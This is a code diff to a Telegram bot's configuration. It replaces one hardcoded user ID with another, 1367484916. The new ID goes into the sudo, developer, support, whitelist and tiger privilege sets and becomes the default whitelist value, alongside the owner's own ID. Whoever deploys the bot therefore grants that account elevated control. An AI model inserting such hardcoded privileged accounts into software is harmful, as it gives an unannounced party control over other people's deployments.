@@ -48,7 +48,7 @@ if ENV:
         raise Exception("Your spammers users list does not contain valid integers.")
 
     try:
-        WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
+        WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "1367484916").split())
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
@@ -142,14 +142,14 @@ else:
     
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1100231654)
+SUDO_USERS.add(1367484916)
 
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1100231654)
-SUPPORT_USERS.add(1100231654)
-WHITELIST_USERS.add(1100231654)
+DEV_USERS.add(1367484916)
+SUPPORT_USERS.add(1367484916)
+WHITELIST_USERS.add(1367484916)
 
-TIGER_USERS.add(1100231654)
+TIGER_USERS.add(1367484916)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
